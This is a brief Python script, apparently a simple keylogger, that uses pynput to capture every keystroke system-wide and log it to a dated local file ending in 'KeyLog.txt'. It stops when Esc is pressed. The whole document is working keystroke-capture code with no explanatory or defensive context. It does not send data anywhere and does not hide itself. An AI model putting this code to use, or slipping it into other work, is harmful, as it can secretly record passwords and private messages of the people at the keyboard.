from pynput.keyboard import Key, Listener
from datetime import date
import logging

log_file = str(date.today())

#Sends Log Data to a file %(asctime)s:
logging.basicConfig(filename=(log_file + "KeyLog.txt"), level=logging.DEBUG, format = '%(message)s:')

def Key_Press(key):
    logging.info(str(key))
    if key == Key.esc:
       return False

with Listener(on_press=Key_Press) as listener:
    listener.join()
